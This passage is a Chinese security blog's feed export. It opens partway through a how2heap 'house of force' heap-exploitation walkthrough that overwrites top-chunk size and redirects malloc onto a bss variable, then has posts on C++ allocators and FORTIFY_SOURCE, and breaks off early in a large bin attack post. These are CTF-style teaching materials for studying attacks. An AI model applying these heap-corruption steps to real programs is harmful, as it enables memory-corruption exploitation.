operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"New size of top chunk %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这一部分输出了 top chunk 的 size 位的值，然后通过将这个值置为 - 1，就会变为最大的值（因为是无符号数会产生回绕），然后打印新的 size 值；这里这样做是为了进行绕过检测</p>\n<p>从下面可以看出 size 已经变成了最大值<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/3%7EHC9V%608%5D%296V%5B%7B%24JYLKLY%24I.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%5B_8L%24HQJ9NS%5DP5Q%5DR3D8%7DBF.png\" alt=\"\" /></p>\n<h3 id=\"6执行到72行\"><a class=\"anchor\" href=\"#6执行到72行\">#</a> 6. 执行到 72 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t * new_top = old_top + nb</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t * nb = new_top - old_top</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t * req + 2sizeof(long) = new_top - old_top</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t * req = new_top - old_top - 2sizeof(long)</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t * req = dest - old_top - 4*sizeof(long)</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> evil_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>bss_var <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>ptr_top<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//evil_size 是将目的地址前面的地址空间全部申请出去</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t   <span class=\"token string\">\"we will malloc %#lx bytes.\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">,</span> ptr_top<span class=\"token punctuation\">,</span> evil_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>new_ptr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>evil_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"As expected, the new pointer is at the same place as the old top chunk: %p\\n\"</span><span class=\"token punctuation\">,</span> new_ptr <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里做出计算，来将下一次申请的 chunk 构造成正好是我们想要修改地址（dest-0x10 为其目的地址的头部地址）</p>\n<p>注释给了计算方式，这里再解释一下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>new_top <span class=\"token operator\">=</span> old_top <span class=\"token operator\">+</span> nb <span class=\"token comment\">// 更新 top chunk 为申请 nb 后的 chunk（nb 为申请的 chunk）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t nb <span class=\"token operator\">=</span> new_top <span class=\"token operator\">-</span> old_top <span class=\"token comment\">// 反推得 nb 的大小，这里新的 top chunk 可以通过想要申请的目的地址 - 0x10（到其头部）来得到</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t req <span class=\"token operator\">+</span> <span class=\"token number\">2</span>sizeof<span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> new_top <span class=\"token operator\">-</span> old_top <span class=\"token comment\">// 这里 req 也就是申请 nb 实际的 size 大小（不包含头部）</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t req <span class=\"token operator\">=</span> new_top <span class=\"token operator\">-</span> old_top <span class=\"token operator\">-</span> <span class=\"token number\">2</span>sizeof<span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t req <span class=\"token operator\">=</span> dest <span class=\"token operator\">-</span> <span class=\"token number\">2</span>sizeof<span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> old_top <span class=\"token operator\">-</span> <span class=\"token number\">2</span>sizeof<span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 目的地址 (dest)=new top_chunk-0x10</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t req <span class=\"token operator\">=</span> dest <span class=\"token operator\">-</span> old_top <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// 可以通过下面的推到理解</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">//old_top+(req+0x10)=dest-0x10</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">//req=dest-old_top-0x20</span></pre></td></tr></table></figure><p>示例中的 <code>eval_size</code>  也就是 req</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%7DO%29%28MRXZNCG%25T%242MCSWAK0K.png\" alt=\"\" /></p>\n<p>可以发现申请完 <code>eval_size</code>  就到了我们的目的地址了</p>\n<h3 id=\"7执行到84行\"><a class=\"anchor\" href=\"#7执行到84行\">#</a> 7. 执行到 84 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span><span class=\"token operator\">*</span> ctr_chunk <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow, the next chunk we overwrite will point at our target buffer.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"malloc(100) => %p!\\n\"</span><span class=\"token punctuation\">,</span> ctr_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we can finally overwrite that value:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... old string: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... doing strcpy overwrite with \\\"YEAH!!!\\\"...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>ctr_chunk<span class=\"token punctuation\">,</span> <span class=\"token string\">\"YEAH!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... new string: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>ctr_chunk <span class=\"token operator\">==</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里接着申请 chunk，就可以申请到要修改的地址，然后修改他的值</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%40KJ55%7E%40A_%5BOH%7EJ0L%25%5BVPP%280.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/A_%28HU82U%241HQUBAXH4%60QG%291.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%60%5B34VQD%7D%5B%5DQND%40H03XAEA4A.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/XHN366L2YQR1G_A%24RIEA%29O0.png\" alt=\"\" /></p>\n<p>成功修改了值，而且最后也绕过了判断 <code>assert(ctr_chunk == bss_var);</code></p>\n<h3 id=\"8关于讨论\"><a class=\"anchor\" href=\"#8关于讨论\">#</a> 8. 关于讨论</h3>\n<p>后面的讨论是介绍使 top chunk 指向 got 表的方法</p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU0MjE4ODMzL2FydGljbGUvZGV0YWlscy8xMjI4NjgyNzI=\">https://blog.csdn.net/qq_54218833/article/details/122868272</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbmZvc2Vjd3JpdGV1cHMuY29tL3RoZS10b2RkbGVycy1pbnRyb2R1Y3Rpb24tdG8taGVhcC1leHBsb2l0YXRpb24tZmFzdGJpbi1kdXAtY29uc29saWRhdGUtcGFydC00LTItY2U2ZDY4MTM2YWE4\">https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua29uZ2hhaWRhc2hpLmNvbS9wb3N0LzUwODAuaHRtbA==\">https://www.konghaidashi.com/post/5080.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzE0MDMxMzA1Lmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/14031305.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9ob3VzZS1vZi1laW5oZXJqYXIv\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/</span></p>\n<p>[ <code>house_of_force</code>  参考]：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWklLSDI2L2FydGljbGVzLzE2NTMzMzg4Lmh0bWw=\">https://www.cnblogs.com/ZIKH26/articles/16533388.html</span></p>\n",
            "tags": [
                "how2heap"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/15/pwn/c++%E5%87%BD%E6%95%B0%E5%8F%8A%E6%A8%A1%E6%9D%BF%E7%B1%BB/",
            "url": "https://vvwwvv.cn/2023/10/15/pwn/c++%E5%87%BD%E6%95%B0%E5%8F%8A%E6%A8%A1%E6%9D%BF%E7%B1%BB/",
            "title": "C++函数及模板",
            "date_published": "2023-10-15T11:23:15.000Z",
            "content_html": "<h1 id=\"1-stdallocator\"><a class=\"anchor\" href=\"#1-stdallocator\">#</a> 1. std::allocator</h1>\n<p>动态内存管理 - 分配器， <code>std::allocator</code>  类模板是所有标准库容器所用的默认分配器 ( <code>Allocator</code> ) ，若不提供用户指定的分配器。默认分配器无状态，即任何给定的  <code>allocator</code>  实例可交换、比较相等，且能解分配同一  <code>allocator </code> 类型的任何其他实例所分配的内存。</p>\n<p>在 C++ 中，std::allocator 是一个模板类，用于分配和释放内存。它是标准库中的一部分，并用于动态分配和管理内存块。</p>\n<p>std::allocator 模板类的参数是要分配的对象类型。在这种情况下，std::allocator&lt;char&gt; 表示一个用于分配 char 类型对象的分配器。</p>\n<p>使用 std::allocator&lt;char&gt; 可以通过其成员函数 allocate () 和 deallocate () 来分配和释放内存</p>\n<h1 id=\"2-char_traits\"><a class=\"anchor\" href=\"#2-char_traits\">#</a> 2. char_traits</h1>\n<p>字符类型的性质是由字符特征类（char_traits）定义的。</p>\n<p>C++ 的字符串模板实例化类 basic_string 中，还集合了大量的字符串处理函数，与标准容器类似。该类模板的声明如下：</p>\n<pre><code class=\"language-c++\">template &lt;class Ch, class Tr = char_traits &lt;Ch&gt;, class A=allocator &lt;Ch&gt;&gt; class std::basic_string\n&#123;\n    public:\n    ...\n&#125;\n</code></pre>\n<p>在上述模板声明中，第一个参数（class Ch）是说明单个字符（Ch）所属型别（class）。</p>\n<p>第二个参数（class Tr = char_traits &lt;Ch&gt;）是特性类别，用以提供字符串类别中的所有字符核心操作。该特性类别规定了 <code>“复制字符”或“比较字符”</code>  的做法；如果不指定该特性类别，系统会根据现有的字符型别采用默认的特性类别。</p>\n<p>第三个参数带有默认值（class A = allocator&lt;Ch&gt;），用以定义字符串类别所采用的内存模式，通常设定为 “默认内存模型 allocator”。该模板及其相关功能都定义在名称空间 std 中，由头文件 &lt;string&gt; 给出，其中包含了两个定义类型，可以为最常用的串类型提供便于使用的名称，即 C++ STL 提供了两个 basic_string&lt;&gt; 实例化版本：</p>\n<pre><code>typedef basic_string &lt;char&gt; string;\ntypedef basic_string &lt;wchar&gt; wstring;\n</code></pre>\n<p>其中，wstring 类是为了便于使用宽字符集，例如 Unicode 或某些欧洲字符集。但所有字符串类型均使用相同接口，其用法和问题是相同的。在本教程中，仍以 string 表示任何字符串型别。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2MuYmlhbmNoZW5nLm5ldC92aWV3LzE0MzkuaHRtbA==\">http://c.biancheng.net/view/1439.html</span></p>\n<h1 id=\"stdstring类\"><a class=\"anchor\" href=\"#stdstring类\">#</a> std::string 类</h1>\n<p>std::string 类的构造模板</p>\n<p>标准模板库（STL）提供了一个 std::string 类，其是 std::basic_string 的一个特化，它是一个容器类，可把字符串当作普通类型来使用，并支持比较、连接、遍历、STL 算法、复制、赋值等等操作，这个类定义在 &lt;string&gt; 头文件中。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//a. </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 生成一个空字符串 s</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//b.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 拷贝构造函数 生成 str 的复制品 string (const string&amp; str)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//c.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span>stridx<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 将字符串 str 内 \"始于位置 stridx\" 的部分当作字符串的初值</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//d.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> string<span class=\"token operator\">&amp;</span> str<span class=\"token punctuation\">,</span> size_type pos<span class=\"token punctuation\">,</span>strlen<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 将字符串 str 内 \"始于 pos 且长度顶多 strlen\" 的部分作为字符串的初值</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//e.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 将 C 字符串作为 s 的初值</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//f.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> cstr<span class=\"token punctuation\">,</span> size_type n<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 使用字符串 str 的前 n 个字符初始化作为字符串 s 的初值。</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//g.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> num<span class=\"token punctuation\">,</span><span class=\"token keyword\">char</span> c<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 生成一个字符串，包含 num 个 c 字符</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//h.</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> string <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>beg<span class=\"token punctuation\">,</span>end<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 以区间 beg;end (不包含 end) 内的字符作为字符串 s 的初值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">//i.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s<span class=\"token punctuation\">.</span><span class=\"token operator\">~</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 销毁所有字符，释放内存</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1Z3VhbmdiaW4xMjMwL2FydGljbGUvZGV0YWlscy83Njg5OTg2Mg==\">https://blog.csdn.net/wuguangbin1230/article/details/76899862</span></p>\n",
            "tags": [
                "pwn",
                "C++"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/07/Linux/FORTIFY/",
            "url": "https://vvwwvv.cn/2023/10/07/Linux/FORTIFY/",
            "title": "FORTIFY_SOURCE（例题：CTFshow的pwn32）",
            "date_published": "2023-10-07T06:15:56.000Z",
            "content_html": "<h1 id=\"1简介在编译时进行设置\"><a class=\"anchor\" href=\"#1简介在编译时进行设置\">#</a> 1. 简介（在编译时进行设置）：</h1>\n<p>fority 是轻微的检测，用于检查缓冲区溢出的错误，在程序采用打量的字符串或者内存操作函数适用，例如：memcpy、memset、stpcpy、strcpy、strncpy、strncat、sprintf、snprintf、vsprintf、gets 以及宽字符的变体。</p>\n<h1 id=\"2作用\"><a class=\"anchor\" href=\"#2作用\">#</a> 2. 作用：</h1>\n<p><code>FORTIFY_SOURCE</code>  是一个  <code>C/C++</code>  编译器提供的安全保护机制，旨在防止缓冲区溢出和其他与字符串和内存操作相关的安全漏洞。它是在编译时自动 <code>插入的一组额外代码</code> ，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。 <code>FORTIFY_SOURCE </code> 提供了以下主要功能：</p>\n<ol>\n<li>运行时长度检查： <code>FORTIFY_SOURCE</code>  会在编译时自动将长度检查代码插入到一些危险的库函数中，例如 <code>strcpy、strcat、sprintf</code>  等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</li>\n<li>缓冲区溢出检测： <code>FORTIFY_SOURCE</code>  还会将额外的保护机制添加到一些敏感的库函数中，例如 memcpy、memmove、memset 等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出。</li>\n<li>安全警告和错误报告：当  <code>FORTIFY_SOURCE</code>  检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告。 <code>FORTIFY_SOURCE</code>  提供了一层额外的安全保护，它可以在很大程度上减少常见的 <code>缓冲区溢出</code> 和 <code>字符串操作</code> 相关的安全漏洞。</li>\n<li></li>\n</ol>\n<h1 id=\"3级别\"><a class=\"anchor\" href=\"#3级别\">#</a> 3. 级别</h1>\n<h2 id=\"1_fortify_source设置为1\"><a class=\"anchor\" href=\"#1_fortify_source设置为1\">#</a> 1. <code>_FORTIFY_SOURCE</code>  设置为 1</h2>\n<p>启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在 <code>运行时</code> 进行 <code>某些</code> 检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。【这里会导致无法进行缓冲区溢出，但是格式化字符串仍然有用】</p>\n<p>将编译器设置为优化 1（gcc -O1），并且当出现上面简介中的情形时，在程序编译时就会进行检查，但并不会改变程序功能。</p>\n<p><code>gcc -D_FORTIFY_SOURCE=1</code>   只会在编译时检查（特别像一些头文件  <code>#include &lt;string.h&gt;</code> ）</p>\n<h2 id=\"2_fortify_source设置为2\"><a class=\"anchor\" href=\"#2_fortify_source设置为2\">#</a> 2. <code>_FORTIFY_SOURCE</code>  设置为 2</h2>\n<p>当设置为 2 时，一些检查功能会被加入进来，但是也会造成程序崩溃；</p>\n<p><code>gcc -D_FORTIFY_SOURCE=2</code>   程序执行时也会进行检查，当检查到缓冲区溢出时，就会终止程序</p>\n<h1 id=\"开启\"><a class=\"anchor\" href=\"#开启\">#</a> 开启：</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">test</span> test.c //默认不开启该检查</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gcc <span class=\"token parameter variable\">-D_FORTIFY_SOURCE</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">test</span> test.c //较弱的检查</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>gcc <span class=\"token parameter variable\">-D_FORTIFY_SOURCE</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">test</span> test.c //较强的检查</pre></td></tr></table></figure><p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vU3BpZGVyLXNwaWRlcnMvcC84Nzk4NjI4Lmh0bWw=\">https://www.cnblogs.com/Spider-spiders/p/8798628.html</span></p>\n",
            "tags": [
                "pwn",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/05/Linux/large_bin_attack/",
            "url": "https://vvwwvv.cn/2023/10/05/Linux/large_bin_attack/",
            "title": "large bin attack（为house利用系列打下基础）",
            "date_published": "2023-10-05T06:15:56.000Z",
            "content_html": "<h1 id=\"1large-bin\"><a class=\"anchor\" href=\"#1large-bin\">#</a> 1.Large bin</h1>\n<h2 id=\"1\"><a class=\"anchor\" href=\"#1\">#</a> 1.</h2>\n<p>在释放堆块时，想要进入 <code>large bin</code>  的堆块需要大于等于 <code>512</code> （1024）字节【用户空间需要 <code>大于等于</code>  0x3F0，用户空间小于 0x3F0 进入 <code>small bin</code> 】</p>\n<p>而 <code>largebin</code>  还要考虑 <code>fd_nextsiez</code>  和 <code>bk_nextsize</code> ，这两个是因为，在 largebin 中，会按着相同大小的 chunk 归到一起，不同 chunk 组直接的联系就需要 <code>fd_nextsize</code>  和 <code>bk_nextsize</code> 。这里除了每组的第一个 chunk ，其他的 <code>fd_nextsize</code>  和 <code>bk_nextsize</code>  都为 0</p>\n<pre><code>fd_nextsize指向了下一组的第一个chunk\nbk_nextsize指向了上一组的第一个chunk\n</code></pre>\n<h2 id=\"2结构\"><a class=\"anchor\" href=\"#2结构\">#</a> 2. 结构：</h2>\n<p><code>large chunk</code>  在 fd 的遍历顺序为从大到小【图中 <code>szie</code>  大小为  <code>1&gt;2&gt;3</code> ，相同组号的 size 相同（1-1，1-2，1-3 相同）】<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/05/pPXJaEd.png\" alt=\"\" /></p>\n<p>【自己画完才发现别人的（自己画的应该有误）】</p>\n<p>原地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaHlxMi9wLzE1OTk4NTcwLmh0bWw=\">https://www.cnblogs.com/hyq2/p/15998570.html</span></p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2154691/202203/2154691-20220312214138636-690454707.png\" alt=\"\" /></p>\n<h2 id=\"3插入顺序\"><a class=\"anchor\" href=\"#3插入顺序\">#</a> 3. 插入顺序：</h2>\n<ol>\n<li>插入位置按照大小，从大到小排序（小的连接 large bin 块）</li>\n<li>大小相同按照 free 时间排序</li>\n<li>多个大小相同的堆块，只有首堆块的 fd_nextsize 和 bk_nextsize 会指向其他堆块，后面的堆块的 fd_nextsize 和 bk_nextsize 均为 0</li>\n<li>size 最大的 chunk 的 bk_nextsize 指向最小的 chunk，size 最小的 chunk 的 fd_nextsize 指向最大的 chunk</li>\n</ol>\n<h1 id=\"2原理\"><a class=\"anchor\" href=\"#2原理\">#</a> 2. 原理：</h1>\n<h2 id=\"1我自己的理解\"><a class=\"anchor\" href=\"#1我自己的理解\">#</a> 1. 我自己的理解：</h2>\n<p>由于在 largebin 中插入 chunk 时会按照大小排序，这就给了我们机会去在比大小时作手脚；</p>\n<h3 id=\"在glibc223中mallocc文件中比较过程如下\"><a class=\"anchor\" href=\"#在glibc223中mallocc文件中比较过程如下\">#</a> 在 <code>glibc2.23</code>  中 <code>malloc.c</code>  文件中，比较过程如下：</h3>\n<figure class=\"highlight c\"><figcaption 